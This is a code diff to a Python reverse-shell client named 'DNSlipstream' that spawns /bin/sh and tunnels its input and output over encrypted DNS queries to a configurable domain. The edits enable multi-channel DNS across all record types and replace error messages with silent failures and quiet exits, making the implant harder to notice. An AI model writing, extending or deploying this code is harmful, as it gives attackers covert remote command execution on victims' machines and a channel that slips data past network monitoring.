@@ -4,8 +4,10 @@ import os
 import subprocess
 import platform
 
+
 sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))
 from lib.transport.stream import dns_stream
+
 
 # Try to import embedded config first
 try:
@@ -15,9 +17,11 @@ except ImportError:
     EMBEDDED_KEY = None
     EMBEDDED_DOMAIN = None
 
+
 # Get from environment or embedded config
-TARGET_DOMAIN = EMBEDDED_DOMAIN or 'c.example.com'
-ENCRYPTION_KEY = EMBEDDED_KEY or ''
+TARGET_DOMAIN = EMBEDDED_DOMAIN or os.getenv('TARGET_DOMAIN') or 'c.example.com'
+ENCRYPTION_KEY = EMBEDDED_KEY or os.getenv('ENCRYPTION_KEY') or ''
+
 
 # Validate
 if not ENCRYPTION_KEY:
@@ -31,10 +35,11 @@ if len(ENCRYPTION_KEY) != 64:
 
 print(f"=== DNSlipstream Client ===")
 
+
 def main():
     """Main function to run the reverse shell client."""
     
-    # Check if configuration is provided
+        # Check if configuration is provided
     if not TARGET_DOMAIN or not ENCRYPTION_KEY:
         print("Error: TARGET_DOMAIN and ENCRYPTION_KEY must be set")
         print("Usage: TARGET_DOMAIN=c.example.com ENCRYPTION_KEY=<hex_key> python shell.py")
@@ -46,8 +51,17 @@ def main():
     else:
         shell_cmd = ["/bin/sh", "-c", "/bin/sh"]
     
-    # Create DNS transport stream
-    dns_transport = dns_stream(TARGET_DOMAIN, ENCRYPTION_KEY)
+    # Create DNS transport stream with multi-channel enabled
+    try:
+        dns_transport = dns_stream(
+            target_domain=TARGET_DOMAIN,
+            encryption_key=ENCRYPTION_KEY,
+            max_workers=8,
+            enable_multi_channel=True,
+            preferred_record_types=None  # Use all record types
+        )
+    except Exception:
+        sys.exit(1)
     
     # Spawn the shell process with DNS transport as stdin/stdout/stderr
     try:
@@ -66,12 +80,16 @@ def main():
             """Read from DNS and write to shell stdin."""
             try:
                 while True:
-                    data = dns_transport.read()
+                    data = dns_transport.read(timeout=1.0)
                     if data:
                         cmd.stdin.write(data)
                         cmd.stdin.flush()
-            except Exception as e:
-                print(f"stdin error: {e}")
+                    
+                    # Check if process is still alive
+                    if cmd.poll() is not None:
+                        break
+            except Exception:
+                pass
         
         def pipe_stdout():
             """Read from shell stdout and write to DNS."""
@@ -80,8 +98,10 @@ def main():
                     data = cmd.stdout.read(1024)
                     if data:
                         dns_transport.write(data)
-            except Exception as e:
-                print(f"stdout error: {e}")
+                    elif cmd.poll() is not None:
+                        break
+            except Exception:
+                pass
         
         def pipe_stderr():
             """Read from shell stderr and write to DNS."""
@@ -90,8 +110,10 @@ def main():
                     data = cmd.stderr.read(1024)
                     if data:
                         dns_transport.write(data)
-            except Exception as e:
-                print(f"stderr error: {e}")
+                    elif cmd.poll() is not None:
+                        break
+            except Exception:
+                pass
         
         # Start I/O bridge threads
         threading.Thread(target=pipe_stdin, daemon=True).start()
@@ -101,11 +123,28 @@ def main():
         # Wait for shell to exit
         cmd.wait()
         
+        # Clean up
+        dns_transport.close()
+        
     except KeyboardInterrupt:
-        print("\nShutting down...")
+        # Clean shutdown
+        try:
+            cmd.terminate()
+            cmd.wait(timeout=2)
+        except:
+            cmd.kill()
+        
+        dns_transport.close()
         sys.exit(0)
-    except Exception as e:
-        print(f"Error running shell: {e}")
+        
+    except Exception:
+        # Clean up
+        try:
+            cmd.kill()
+        except:
+            pass
+        
+        dns_transport.close()
         sys.exit(1)
 
 
